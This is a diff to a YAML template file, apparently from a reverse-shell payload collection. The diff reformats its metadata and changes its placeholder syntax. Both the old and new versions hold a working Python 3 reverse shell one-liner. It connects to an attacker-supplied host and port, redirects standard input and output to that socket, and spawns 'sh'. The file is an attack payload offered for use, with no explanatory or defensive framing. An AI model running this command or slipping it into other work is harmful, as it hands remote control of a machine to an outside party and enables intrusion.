@@ -1,9 +1,12 @@
----
 metadata:
-  filename: "revshell-linux-python3-env.yaml"
-  tags: ["shell", "linux"]
-  created: "2025-03-29"
-  author: "Unknown"
+  filename: revshell-linux-python3-env.yaml
+  tags:
+  - shell
+  - linux
+  created: '2025-03-29'
+  author: Unknown
+content: 'export RHOST="{{ attacker_ip }}";export RPORT="{{ shell_port }}";python3
+  -c ''import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd)
+  for fd in (0,1,2)];pty.spawn("sh")''
 
-content: |
-  export RHOST="<%=$(esh variables/attacker_ip)%>";export RPORT="<%=$(esh variables/shell_port)%>";python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+  '
